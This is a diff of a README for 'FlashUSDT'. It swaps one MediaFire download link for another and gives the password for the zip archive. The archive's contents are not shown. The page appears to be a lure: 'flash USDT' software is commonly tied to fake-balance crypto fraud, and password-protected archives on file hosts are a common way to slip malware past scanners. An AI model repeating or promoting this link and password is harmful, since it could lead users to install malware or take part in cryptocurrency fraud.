@@ -1,6 +1,6 @@
 # FlashUSDT
 
-[Click Here To Download](https://www.mediafire.com/file/yfe990tjkexq46q/FlashUSDT.zip/file)
+[Click Here To Download](https://www.mediafire.com/file/if9gujtu96l1g9j/FlashUSDT.zip/file)
 [Pass : S3rv3r%.]
 
 
